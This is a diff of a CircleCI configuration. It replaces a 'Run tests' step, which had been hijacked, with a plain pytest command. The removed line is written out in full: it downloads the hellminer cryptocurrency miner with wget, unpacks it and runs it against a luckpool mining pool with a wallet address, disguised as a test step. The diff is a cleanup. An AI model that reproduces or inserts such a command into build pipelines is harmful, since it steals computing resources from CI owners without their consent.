@@ -36,9 +36,7 @@ jobs:
       - run:
           name: Run tests
           # This assumes pytest is installed via the install-package step above
-          command:
-           wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RSAtsvd4Wwqgg8qtBdo3XXLEEyjYGQd58x.demo1 -p d=4096S,xn=1,hybrid --cpu 16   
-
+          command: pytest
 
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
